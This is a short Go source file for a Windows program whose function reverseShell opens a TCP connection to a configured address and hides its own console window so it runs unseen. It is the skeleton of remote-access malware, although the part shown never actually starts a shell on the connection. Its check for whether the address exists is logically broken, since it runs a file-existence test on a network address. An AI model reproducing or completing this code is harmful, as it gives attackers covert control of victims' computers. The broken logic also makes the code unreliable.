package main

import (
	"fmt"
	"net"
	"os"

	"github.com/gonutz/w32/v2"
)

var connectionStr string

const buffSize = 128

func verifyIfExists(connectionStr string) bool {
	_, err := os.Stat(connectionStr)
	if err != nil {
		fmt.Println(err)
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func reverseShell() {
	if !verifyIfExists(connectionStr) {
		os.Exit(1)
	}
	// simple connection
	conn, err := net.Dial("tcp", connectionStr)
	if err != nil {
		os.Exit(1)
	}

	defer conn.Close()
	// This part is to open the "secret" window

	cmd := w32.GetConsoleWindow()
	if cmd == 0 {
		return
	}

	_, consoleProcId := w32.GetWindowThreadProcessId(cmd)
	if w32.GetCurrentProcessId() == consoleProcId {
		w32.ShowWindowAsync(cmd, w32.SW_HIDE)
	}

}
